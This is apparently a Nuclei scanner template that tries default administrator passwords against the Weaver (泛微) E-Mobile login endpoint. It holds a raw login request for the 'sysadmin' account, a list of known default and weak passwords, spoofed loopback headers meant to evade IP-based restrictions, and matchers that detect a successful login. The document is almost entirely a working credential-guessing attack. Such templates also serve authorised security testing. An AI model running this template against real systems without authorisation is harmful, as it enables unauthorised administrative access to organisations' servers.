id: weaver-e-mobile-default-login

info:
  name: 泛微-EMobile 默认密码
  author: SleepingBag945
  severity: high

http:
  - raw:
      - |
        POST /emp/passport/login HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
        Accept: application/json, text/plain, */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        X-Forwarded-For: 127.0.0.1
        X-Originating-IP: 127.0.0.1
        X-Remote-Addr: 127.0.0.1
        X-Remote-IP: 127.0.0.1
        Connection: close
        Content-Type: application/json

        {"key":"","loginid":"sysadmin","password":"{{password}}","login_type":2}

    payloads:
      password:
        - 1
        - Weaver@2022
        - Weaver@2021
        - Weaver@2020
        - Weaver@2019
        - Weaver@2018
        - Weaver#2012!@#
        - Weaver@2001
        - Weaver@2022
        - admin
        - 123456
        - 111111
        
    stop-at-first-match: true
    matchers:
      - type: dsl
        condition: or
        dsl:
          - status_code==200 && contains_all(body,"\"errcode\":0")
          - status_code==200 && contains_all(body,"birthday")